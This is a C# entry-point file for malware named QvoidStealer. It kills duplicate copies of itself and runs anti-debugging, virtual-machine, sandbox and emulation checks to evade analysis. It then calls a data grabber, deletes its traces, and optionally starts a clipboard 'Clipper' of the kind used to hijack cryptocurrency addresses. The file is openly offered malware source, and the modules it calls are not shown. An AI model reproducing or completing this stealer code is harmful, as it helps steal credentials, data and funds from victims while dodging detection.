using QvoidStealer.Main;
using QvoidWrapper;
using System;
using System.Diagnostics;
using System.Globalization;
using System.Threading;

namespace QvoidStealer
{
    internal static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            new Thread(() =>
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;

                Console.WriteLine(@"https://sir_I_am_illusioning_or_you_reading_me?_ ");

                foreach (var proc in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
                    if (proc.MainModule.FileName == Process.GetCurrentProcess().MainModule.FileName && proc.Id != Process.GetCurrentProcess().Id)
                        proc.Kill();

                Protection.WebSniffers(Settings.AntiWebSinffers);
                Protection.AntiDebug(Settings.AntiDebug);
                Protection.DetectVM(Settings.AntiVM);
                Protection.Sandboxie(Settings.AntiSandBoxie);
                Protection.Emulation(Settings.AntiEmulation);

                Grabber.Grab(args);
                Grabber.DeleteTraces(false, false);

                if (Settings.Clipper.Enabled)
                    Settings.Clipper.Start();

                Environment.Exit(0);
            })
            .Start();

            Thread.Sleep(-1);
        }
    }
}